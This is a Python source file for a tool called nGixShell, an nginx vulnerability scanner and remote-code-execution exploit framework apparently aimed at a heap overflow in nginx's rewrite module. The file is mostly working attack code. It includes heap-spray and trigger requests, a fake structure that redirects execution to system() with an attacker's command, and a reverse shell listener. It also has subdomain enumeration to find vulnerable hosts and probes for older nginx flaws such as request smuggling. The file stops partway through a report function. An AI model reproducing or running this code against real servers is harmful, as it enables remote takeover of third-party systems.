#!/usr/bin/env python3
"""
nGixShell — nginx CVE scanner + RCE exploit framework
Proof of concept for CVE-2026-42945 and 16 other nginx vulnerabilities.
Heap buffer overflow in ngx_http_rewrite_module (nginx 0.6.27 – 1.30.0)
"""

BANNER = r"""
╔════════════════════════════════════════════════════════╗
║          _______      _____ __         ____            ║
║   ____  / ____(_)  __/ ___// /_  ___  / / /           ║
║  / __ \/ / __/ / |/_/\__ \/ __ \/ _ \/ / /            ║
║ / / / / /_/ / />  < ___/ / / / /  __/ / /             ║
║/_/ /_/\____/_/_/|_|/____/_/ /_/\___/_/_/              ║
╠════════════════════════════════════════════════════════╣
║  nginx CVE Scanner + RCE Exploit Framework             ║
║  17 CVEs  ·  CVE-2026-42945  ·  by Mateus Veras        ║
╚════════════════════════════════════════════════════════╝
"""
import argparse
import re
import select
import socket
import ssl
import struct
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ─── Safe-byte filter ─────────────────────────────────────────────────────────
# Bytes nginx maps to themselves in NGX_ESCAPE_ARGS mode.
# Any other byte expands to %XX (3 chars) during the copy pass, making the
# overflow size unpredictable. Table lifted directly from nginx source.
SAFE = set()
_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
for _b in range(256):
    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
        SAFE.add(_b)

# ─── Exploit constants (valid for the Docker image provided; ASLR disabled) ──
HEAP_BASE   = 0x555555659000
LIBC_BASE   = 0x7ffff77ba000
SYSTEM_ADDR = LIBC_BASE + 0x50d70

# Fake ngx_pool_cleanup_s: { handler (Q) | data (Q) | padding (Q) }
FAKE_STRUCT_SIZE = struct.calcsize('<QQQ')

PREREAD_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]

VULN_MIN = (0, 6, 27)
VULN_MAX = (1, 30, 0)

# ─── Built-in subdomain wordlist ──────────────────────────────────────────────
COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "api", "dev", "test", "staging", "app", "admin",
    "blog", "shop", "cdn", "static", "media", "assets", "images", "img",
    "upload", "downloads", "secure", "vpn", "remote", "portal", "login",
    "auth", "oauth", "sso", "payment", "checkout", "store", "m", "mobile",
    "beta", "demo", "dashboard", "status", "monitor", "metrics", "grafana",
    "jenkins", "gitlab", "git", "svn", "jira", "confluence", "wiki", "docs",
    "help", "support", "kb", "forum", "community", "chat", "news", "press",
    "careers", "jobs", "hr", "intranet", "internal", "corp", "office",
    "backup", "db", "database", "redis", "elastic", "search", "proxy",
    "gateway", "lb", "ha", "k8s", "docker", "registry", "ci", "cd",
    "build", "deploy", "prod", "uat", "qa", "sandbox", "lab", "data",
    "analytics", "bi", "reporting", "mq", "kafka", "ws", "websocket",
    "ns1", "ns2", "smtp", "webmail", "autodiscover", "cpanel", "panel",
    "externo", "external", "ext", "public", "open", "access", "v2", "v1",
    "api2", "api3", "old", "new", "legacy", "cloud", "aws", "azure",
]

# ─── CVE Database ─────────────────────────────────────────────────────────────
# Each entry:
#   affected_min / affected_max — inclusive (major, minor, patch) tuples
#   config_required             — nginx directives the bug needs to be present
#   local_only                  — True if not remotely exploitable
#   probe                       — function name in PROBE_REGISTRY, or None
#   exploit                     — True if this tool has a working exploit
#
# Sorted by CVSS descending so the most critical appear first.

CVE_DB = OrderedDict([
    ("CVE-2026-42945", {
        "description": "Heap overflow in ngx_http_rewrite_module via URI percent-encoding mismatch (RCE)",
        "cvss": 9.8, "severity": "CRITICAL",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite", "set"],
        "local_only": False, "probe": None, "exploit": True,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42946", {
        "description": "Memory corruption in nginx rewrite engine (sibling of CVE-2026-42945)",
        "cvss": 8.1, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-40701", {
        "description": "Memory corruption in nginx request processing (sibling of CVE-2026-42945)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42934", {
        "description": "Memory corruption in nginx (sibling of CVE-2026-42945, same advisory)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2022-41741", {
        "description": "Memory corruption in ngx_http_mp4_module via malicious mp4 file (RCE)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2022-41742", {
        "description": "Heap memory disclosure in ngx_http_mp4_module via malicious mp4 file",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2021-23017", {
        "description": "Off-by-one in DNS resolver allows 1-byte heap overwrite (potential RCE)",
        "cvss": 7.7, "severity": "HIGH",
        "affected_min": (0, 6, 18), "affected_max": (1, 20, 0),
        "fixed_in": "1.20.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2017-7529", {
        "description": "Integer overflow in range filter allows out-of-bounds memory read",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 5, 6), "affected_max": (1, 13, 2),
        "fixed_in": "1.13.3 / 1.12.1",
        "config_required": [],
        "local_only": False, "probe": "probe_range_overflow", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2016-1247", {
        "description": "Privilege escalation via log file symlink attack (local, packaging issue)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (1, 10, 0),
        "fixed_in": "1.10.1 (distro-specific)",
        "config_required": [],
        "local_only": True, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-4547", {
        "description": "Space + NUL byte in URI bypasses location access restrictions",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 8, 41), "affected_max": (1, 5, 6),
        "fixed_in": "1.5.7 / 1.4.4",
        "config_required": [],
        "local_only": False, "probe": "probe_uri_space", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-2028", {
        "description": "Stack-based buffer overflow in chunked transfer encoding (RCE)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 3, 9), "affected_max": (1, 4, 0),
        "fixed_in": "1.4.1",
        "config_required": [],
        "local_only": False, "probe": "probe_chunked", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2012-2089", {
        "description": "Buffer overflow in ngx_http_mp4_module via malicious mp4 request",
        "cvss": 6.8, "severity": "MEDIUM",
        "affected_min": (1, 0, 7), "affected_max": (1, 1, 3),
        "fixed_in": "1.1.19 / 1.0.15",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2019-20372", {
        "description": "HTTP request smuggling via error_page + proxy_pass configuration",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 17, 6),
        "fixed_in": "1.17.7",
        "config_required": ["error_page", "proxy_pass"],
        "local_only": False, "probe": "probe_smuggling", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2014-3616", {
        "description": "Virtual host confusion via TLS SNI — wrong certificate may be served",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 7, 3),
        "fixed_in": "1.7.4",
        "config_required": ["ssl", "server_name"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2011-4963", {
        "description": "ngx_http_access_module bypass via IPv6 address literal in Host header",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 1, 18),
        "fixed_in": "1.1.19 / 1.0.14",
        "config_required": ["deny", "allow"],
        "local_only": False, "probe": "probe_ipv6_bypass", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-3896", {
        "description": "NULL pointer dereference via crafted request — remote crash (DoS)",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 31),
        "fixed_in": "0.8.32 / 0.7.64",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-2629", {
        "description": "Buffer underflow in ngx_http_parse_complex_uri() — remote crash/RCE",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 14),
        "fixed_in": "0.8.15 / 0.7.62",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
])

# ─── Session-level globals (applied in main() before any call) ────────────────
_verbose:  bool  = False
_tmul:     float = 1.0
_log_fh          = None
_log_lock        = threading.Lock()


# ─── I/O helpers ──────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    with _log_lock:
        print(msg)
        if _log_fh is not None:
            _log_fh.write(msg + "\n")
            _log_fh.flush()


def vlog(msg: str) -> None:
    if _verbose:
        log(msg)


def _sleep(seconds: float) -> None:
    time.sleep(seconds * _tmul)


# ─── Network helpers ──────────────────────────────────────────────────────────

def _connect(host: str, port: int, timeout: float = 5.0,
             tls: bool = False, proxy: str = None) -> socket.socket:
    """
    Open a TCP connection, optionally tunnelled via HTTP CONNECT proxy
    and/or wrapped in TLS.
    """
    if proxy:
        p = urlparse(proxy)
        s = socket.create_connection((p.hostname, p.port or 8080), timeout=timeout)
        tunnel = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
        s.sendall(tunnel.encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        if b" 200 " not in resp:
            s.close()
            raise ConnectionError(f"Proxy CONNECT failed: {resp[:80]!r}")
    else:
        s = socket.create_connection((host, port), timeout=timeout)

    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)

    return s


def _http_head(host: str, port: int, path: str = "/",
               tls: bool = False, proxy: str = None,
               timeout: float = 5.0) -> dict:
    """Send HEAD <path> and return lowercased response headers as dict."""
    s = _connect(host, port, timeout=timeout, tls=tls, proxy=proxy)
    req = f"HEAD {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    s.sendall(req.encode())
    s.settimeout(timeout)
    raw = b""
    try:
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(4096)
            if not chunk:
                break
            raw += chunk
    finally:
        s.close()

    headers = {}
    lines = raw.decode("latin-1", errors="replace").split("\r\n")
    if lines:
        headers["status_line"] = lines[0]
        try:
            headers["status_code"] = int(lines[0].split()[1])
        except (IndexError, ValueError):
            headers["status_code"] = 0
    for line in lines[1:]:
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()
    return headers


# ─── Version detection ────────────────────────────────────────────────────────

def _parse_version(server_header: str):
    """Return (major, minor, patch) from 'nginx/X.Y.Z', or None."""
    m = re.search(r"nginx/(\d+)\.(\d+)\.(\d+)", server_header, re.IGNORECASE)
    return tuple(int(x) for x in m.groups()) if m else None


def _version_in_range(version: tuple, vmin: tuple, vmax: tuple) -> bool:
    return vmin <= version <= vmax


def check_target(host: str, port: int,
                 tls: bool = False, proxy: str = None) -> tuple:
    """
    Probe target, print version status, return (is_vulnerable, version_tuple).
    """
    scheme = "https" if tls else "http"
    log(f"[*] Checking {scheme}://{host}:{port} ...")
    try:
        headers = _http_head(host, port, tls=tls, proxy=proxy)
        server  = headers.get("server", "")
        if not server:
            log("[-] No Server header in response")
            return False, None
        log(f"[+] Server: {server}")
        version = _parse_version(server)
        if version is None:
            log("[-] Not nginx or version not exposed")
            return False, None
        ver_str = ".".join(str(x) for x in version)
        min_str = ".".join(str(x) for x in VULN_MIN)
        max_str = ".".join(str(x) for x in VULN_MAX)
        if _version_in_range(version, VULN_MIN, VULN_MAX):
            log(f"[!] nginx {ver_str} — IN VULNERABLE RANGE ({min_str}–{max_str})")
            return True, version
        log(f"[-] nginx {ver_str} — outside default vulnerable range")
        return False, version
    except Exception as e:
        log(f"[!] Check failed: {e}")
        return False, None


# ─── Heap candidate helpers ───────────────────────────────────────────────────

def addr_is_safe(addr: int) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def get_candidates() -> list:
    """Return (index, addr) pairs for offsets that pass the URI-safe filter."""
    return [(i, HEAP_BASE + off)
            for i, off in enumerate(PREREAD_HEAP_OFFSETS)
            if addr_is_safe(HEAP_BASE + off)]


def list_candidates() -> None:
    log(f"  {'#':<4} {'OFFSET':<12} {'ADDRESS':<18} SAFE")
    log("  " + "─" * 46)
    for i, off in enumerate(PREREAD_HEAP_OFFSETS):
        addr = HEAP_BASE + off
        safe = addr_is_safe(addr)
        log(f"  {i:<4} 0x{off:06x}     0x{addr:012x}     {'yes' if safe else 'NO'}")


def make_body(cmd: str, data_addr: int, body_len: int) -> bytes:
    fake_struct = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
    cmd_bytes   = cmd.encode('utf-8') + b'\x00'
    payload     = fake_struct + cmd_bytes
    if len(payload) > body_len:
        log(f"[!] Command too long (body={len(payload)}, max={body_len})")
        sys.exit(1)
    return payload + b'\x41' * (body_len - len(payload))


# ─── CVE Probes ───────────────────────────────────────────────────────────────
# Each probe returns (result, message):
#   True  = confirmed indicator of vulnerability
#   False = indicator of patched / not affected
#   None  = inconclusive

def probe_range_overflow(host, port, tls, proxy):
    """
    CVE-2017-7529: Range filter integer overflow.
    Send Range header with 2^63-1 offset — patched nginx returns 400,
    vulnerable returns 206 or reads beyond buffer.
    """
    try:
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        req = (
            b"GET / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Range: bytes=0-,9223372036854775807\r\n"
            b"Connection: close\r\n\r\n"
        )
        s.sendall(req)
        s.settimeout(5)
        raw = b""
        while b"\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk:
                break
            raw += chunk
        s.close()
        parts = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400:
            return False, f"400 Bad Request — patched"
        if status in (416, 200):
            return False, f"{status} — range not supported or ignored"
        return True, f"Status {status} for overflow Range — unexpected (indicator)"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_smuggling(host, port, tls, proxy):
    """
    CVE-2019-20372: HTTP request smuggling via error_page + proxy_pass.
    Sends a crafted Content-Length that hides a second request. If two
    HTTP responses are received, smuggling may be possible.
    """
    try:
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=6)
        smuggled = b"GET /nginx-rift-probe-2 HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"
        req = (
            b"GET /nginx-rift-probe-1 HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Content-Length: " + str(len(smuggled)).encode() + b"\r\n"
            b"Connection: keep-alive\r\n\r\n"
            + smuggled
        )
        s.sendall(req)
        s.settimeout(3)
        raw = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                raw += chunk
                if raw.count(b"HTTP/") >= 2:
                    break
        except socket.timeout:
            pass
        s.close()
        if raw.count(b"HTTP/") >= 2:
            return True, "Two HTTP responses — request smuggling indicator"
        return False, "Single response — no smuggling indicator"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_chunked(host, port, tls, proxy):
    """
    CVE-2013-2028: Stack overflow in chunked encoding.
    Sends a chunk size of 0x7fffffff without body. Patched nginx rejects
    or ignores gracefully; vulnerable ones may crash or misbehave.
    This probe avoids sending actual data to prevent crashing the server.
    """
    try:
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        req = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Connection: close\r\n\r\n"
            b"7fffffff\r\n"
        )
        s.sendall(req)
        s.settimeout(3)
        try:
            resp = s.recv(512)
        except socket.timeout:
            resp = b""
        s.close()
        if not resp:
            return True, "No response to oversized chunk — possible crash indicator"
        parts = resp.split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status in (400, 411, 413):
            return False, f"{status} — server rejected oversized chunk (patched)"
        return None, f"Status {status} — inconclusive"
    except ConnectionResetError:
        return True, "Connection reset on oversized chunk — possible crash indicator"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_ipv6_bypass(host, port, tls, proxy):
    """
    CVE-2011-4963: IPv6 literal in Host header bypasses ngx_http_access_module.
    Send request with [::1] as Host. If server returns 200 where it normally
    denies, access module is bypassable.
    """
    try:
        # First get baseline status with normal Host
        baseline = _http_head(host, port, tls=tls, proxy=proxy, timeout=5)
        baseline_status = baseline.get("status_code", 0)

        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        req = b"GET / HTTP/1.1\r\nHost: [::1]\r\nConnection: close\r\n\r\n"
        s.sendall(req)
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk:
                break
            raw += chunk
        s.close()
        parts = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if baseline_status in (403, 401) and status == 200:
            return True, f"IPv6 literal bypassed access control ({baseline_status}→{status})"
        if status == 400:
            return False, "400 for IPv6 literal Host — likely patched"
        return None, f"Baseline {baseline_status} / IPv6 literal {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_uri_space(host, port, tls, proxy):
    """
    CVE-2013-4547: Space + NUL byte in URI bypasses location access restrictions.
    Send a URI with %20%00 to test if the server handles it differently.
    A vulnerable server may serve the file or behave unexpectedly.
    """
    try:
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        # %20 = space, %00 = NUL — the bypass payload
        req = b"GET /nginx-rift-test%20\x00.txt HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"
        s.sendall(req)
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk:
                break
            raw += chunk
        s.close()
        parts = raw.decode("latin-1", errors="replace").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400:
            return False, "400 — server rejected NUL in URI (patched)"
        if status in (200, 403, 404):
            return True, f"Status {status} for URI with NUL byte — server processed it (indicator)"
        return None, f"Status {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


# Registry: probe name → function
PROBE_REGISTRY = {
    "probe_range_overflow": probe_range_overflow,
    "probe_smuggling":      probe_smuggling,
    "probe_chunked":        probe_chunked,
    "probe_ipv6_bypass":    probe_ipv6_bypass,
    "probe_uri_space":      probe_uri_space,
}

# Severity sort order for summary counts
_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}


# ─── CVE scanner ──────────────────────────────────────────────────────────────

def list_cves() -> None:
    """Print all entries in CVE_DB as a formatted table."""
    log(f"\nCVE Database — {len(CVE_DB)} entries")
    log("─" * 102)
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'AFFECTED RANGE':<24} "
        f"{'PROBE':<6} {'EXPLOIT':<8} FIXED IN")
    log("─" * 102)
    for cve_id, info in CVE_DB.items():
        amin = ".".join(str(x) for x in info["affected_min"])
        amax = ".".join(str(x) for x in info["affected_max"])
        rng  = f"{amin} – {amax}"
        log(f"  {cve_id:<18} {info['cvss']:<6} {info['severity']:<10} {rng:<24} "
            f"{'yes' if info['probe'] else 'no':<6} "
            f"{'YES' if info['exploit'] else 'no':<8} "
            f"{info['fixed_in']}")
    log("─" * 102)


def cve_scan(host: str, port: int, tls: bool = False,
             proxy: str = None, target_cve: str = None) -> list:
    """
    Detect nginx version then run version-based and probe-based CVE checks.
    target_cve: if set, only check that one CVE ID.
    Returns list of (cve_id, info, status) for non-patched findings.
    """
    log(f"\n[*] CVE scan — {host}:{port}")
    log("─" * 96)

    # Detect version
    _, version = check_target(host, port, tls, proxy)

    log("")
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'STATUS':<20} DESCRIPTION")
    log("─" * 96)

    targets = ({target_cve: CVE_DB[target_cve]} if target_cve
               else CVE_DB)

    findings = []
    for cve_id, info in targets.items():
        if info.get("local_only"):
            status = "LOCAL-ONLY"
        elif version is None:
            # Can't do version check — run probe only if available
            status = "UNKNOWN"
        elif _version_in_range(version, info["affected_min"], info["affected_max"]):
            # Version in range — try probe
            probe_name = info.get("probe")
            if probe_name and probe_name in PROBE_REGISTRY:
                result, msg = PROBE_REGISTRY[probe_name](host, port, tls, proxy)
                vlog(f"[v] {cve_id} probe: {msg}")
                if result is True:
                    status = "VULNERABLE"
                elif result is False:
                    status = "PROBE-CLEAN"
                else:
                    status = "VERSION-MATCH"
            elif info.get("exploit"):
                status = "EXPLOIT-AVAIL"
            else:
                status = "VERSION-MATCH"
        else:
            status = "PATCHED"

        sev    = info["severity"]
        cvss   = info["cvss"]
        desc   = info["description"]
        short  = (desc[:57] + "...") if len(desc) > 60 else desc
        marker = "[!]" if status in ("VULNERABLE", "EXPLOIT-AVAIL") else \
                 "[-]" if status in ("PATCHED", "PROBE-CLEAN") else \
                 "[?]"

        log(f"  {marker} {cve_id:<16} {cvss:<6} {sev:<10} {status:<20} {short}")

        if status not in ("PATCHED", "LOCAL-ONLY", "PROBE-CLEAN"):
            findings.append((cve_id, info, status))

    log("─" * 96)

    # Summary
    by_sev = {}
    for _, info, status in findings:
        sev = info["severity"]
        by_sev[sev] = by_sev.get(sev, 0) + 1

    sev_summary = " | ".join(
        f"{sev}: {cnt}" for sev, cnt in
        sorted(by_sev.items(), key=lambda x: _SEV_ORDER.get(x[0], 99))
    )
    log(f"\n[+] Potential issues: {len(findings)}  ({sev_summary or 'none'})")

    actionable = [(c, i, s) for c, i, s in findings
                  if s in ("VULNERABLE", "EXPLOIT-AVAIL")]
    if actionable:
        log("\n[!] Actionable findings:")
        for cve_id, info, status in actionable:
            log(f"    {cve_id} ({info['severity']}) — {info['description']}")
            log(f"      Fixed in : {info['fixed_in']}")
            log(f"      Reference: {info.get('ref', 'N/A')}")
            if info.get("exploit"):
                log(f"      Exploit  : use --cmd or --shell to trigger")
            if info.get("config_required"):
                log(f"      Requires : {', '.join(info['config_required'])} directives")

    return findings


# ─── Exploit core ─────────────────────────────────────────────────────────────

def wait_alive(host: str, port: int, timeout: int = 30,
               tls: bool = False, proxy: str = None) -> bool:
    for _ in range(timeout):
        try:
            s = _connect(host, port, timeout=2, tls=tls, proxy=proxy)
            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            s.recv(100)
            s.close()
            return True
        except Exception:
            _sleep(1)
    return False


def attempt(host: str, port: int,
            target_bytes: bytes, body: bytes,
            n_spray: int, body_len: int,
            tls: bool = False, proxy: str = None) -> bool:
    sprays = []
    for i in range(n_spray):
        try:
            s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
            req = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: l\r\n"
                b"Content-Length: " + str(body_len).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n\r\n"
                + body
            )
            s.sendall(req)
            sprays.append(s)
        except Exception as e:
            vlog(f"[v] Spray {i} failed: {e}")
            break
        _sleep(0.005)
    _sleep(0.2)

    try:
        a = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
        _sleep(0.02)
        v = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
        _sleep(0.02)
    except Exception as e:
        vlog(f"[v] Failed to open trigger connections: {e}")
        for s in sprays:
            try: s.close()
            except Exception: pass
        return False

    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
    a.sendall((f"GET /api/{payload} HTTP/1.1\r\n"
               f"Host:localhost\r\n").encode("latin-1"))
    _sleep(0.05)
    v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
    _sleep(0.05)
    a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    _sleep(0.2)

    v.close()
    _sleep(0.1)

    crashed = False
    try:
        a.sendall(b"X-Ping:1\r\n")
        a.settimeout(0.2)
        data = a.recv(1)
        if not data:
            crashed = True
    except socket.timeout:
        # Nginx is either alive (waiting for backend) or hung in system().
        # A fresh connection tells us which.
        try:
            ck = _connect(host, port, timeout=0.2, tls=tls, proxy=proxy)
            ck.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n")
            crashed = not ck.recv(10)
            ck.close()
        except Exception as e:
            vlog(f"[v] Check connection failed: {e}")
            crashed = True
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        vlog(f"[v] Trigger socket error: {e}")
        crashed = True

    for s in sprays:
        try: s.close()
        except Exception: pass
    try: a.close()
    except Exception: pass

    vlog(f"[v] crashed={crashed}")
    return crashed


# ─── Subdomain scanner ────────────────────────────────────────────────────────

def _probe_subdomain(fqdn: str, port: int, tls: bool,
                     proxy: str, timeout: float) -> dict:
    """Resolve + HEAD one subdomain. Returns result dict or None if unreachable."""
    try:
        socket.getaddrinfo(fqdn, port, socket.AF_INET)
    except socket.gaierror:
        return None
    try:
        headers = _http_head(fqdn, port, tls=tls, proxy=proxy, timeout=timeout)
        server  = headers.get("server", "")
        version = _parse_version(server) if server else None
        vuln    = (_version_in_range(version, VULN_MIN, VULN_MAX)
                   if version else False)
        return {
            "host": fqdn, "server": server or "(no Server header)",
            "version": version, "vulnerable": vuln,
        }
    except Exception as e:
        vlog(f"[v] {fqdn}: {e}")
        return None


def subdomain_scan(domain: str, wordlist: list, port: int = 80,
                   tls: bool = False, proxy: str = None,
                   n_threads: int = 20, timeout: float = 5.0) -> list:
    """Probe subdomains concurrently, print table, return result list."""
    log(f"[*] Subdomain scan: {domain} | {len(wordlist)} words | "
        f"{n_threads} threads | port {port}{'(tls)' if tls else ''}")
    log("─" * 68)
    log(f"  {'STATUS':<10} {'HOST':<42} SERVER")
    log("─" * 68)

    results = []
    with ThreadPoolExecutor(max_workers=n_threads) as ex:
        futures = {
            ex.submit(_probe_subdomain,
                      f"{sub}.{domain}", port, tls, proxy, timeout): sub
            for sub in wordlist
        }
        for fut in as_completed(futures):
            r = fut.result()
            if r is None:
                continue
            tag = "[VULN]" if r["vulnerable"] else "[    ]"
            log(f"  {tag:<10} {r['host']:<42} {r['server']}")
            results.append(r)

    log("─" * 68)
    vuln = [r for r in results if r["vulnerable"]]
    log(f"[+] {len(results)} responded | {len(vuln)} potentially vulnerable")
    if vuln:
        log("\n[!] Potentially vulnerable:")
        for r in vuln:
            log(f"    {r['host']}  ({r['server']})")
    return results


# ─── Reverse shell listener ───────────────────────────────────────────────────

def start_shell_listener(port: int) -> threading.Thread:
    """Start a reverse shell listener. Tries nc first, falls back to raw socket."""
    import subprocess

    def _socket_listener():
        log(f"[*] nc not found — using built-in socket listener on :{port}")
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        try:
            conn, addr = srv.accept()
            log(f"[+] Shell connected from {addr[0]}:{addr[1]}")
            while True:
                r, _, _ = select.select([conn, sys.stdin], [], [], 1.0)
                if conn in r:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode("utf-8", errors="replace"))
                    sys.stdout.flush()
                if sys.stdin in r:
                    line = sys.stdin.readline()
                    if not line:
                        break
                    conn.sendall(line.encode())
        except Exception as e:
            vlog(f"[v] Shell listener error: {e}")
        finally:
            srv.close()

    def _run():
        try:
            subprocess.run(["nc", "-l", "-p", str(port)], check=True)
        except FileNotFoundError:
            _socket_listener()
        except Exception as e:
            vlog(f"[v] nc exited: {e}")

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ─── Report ───────────────────────────────────────────────────────────────────

def print_report(target: str, cmd: str, success: bool, elapsed: float,
                 winner_addr: int, winner_try: int,
                 total_attempts: int, candidates_tried: int) -> None:
    lines = [
        "",
